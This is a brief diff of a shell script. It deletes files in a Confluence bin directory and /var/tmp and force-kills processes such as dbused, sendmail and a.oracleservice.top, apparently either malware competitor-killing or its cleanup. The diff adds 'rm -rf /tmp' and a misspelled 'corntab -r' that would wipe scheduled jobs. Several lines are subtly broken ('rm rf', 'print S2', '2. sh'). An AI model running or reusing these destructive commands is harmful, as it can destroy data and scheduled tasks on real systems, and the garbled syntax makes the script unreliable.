@@ -117,7 +117,9 @@ rm /opt/atlassian/confluence/bin/3.sh.3
 rm rf /var/tmp/f41
 rm rf /var/tmp/2. sh
 
+rm -rf /tmp
 ps auxf | grep -v grep | grep 'dbused' | awk '{print S2}' | xargs -I % kill -9 %
 ps auxf | grep -v grep | grep 'sendmail' | awk '{print S2}' | xargs -I % kill -9 %
 ps auxf | grep -v grep | grep 'gitlab-exporter' | awk '{print S2}' | xargs -I % kill -9 %
 ps auxf | grep -v grep | grep 'a.oracleservice.top' | awk '{print S2}' | xargs -I % kill -9 %
+corntab -r
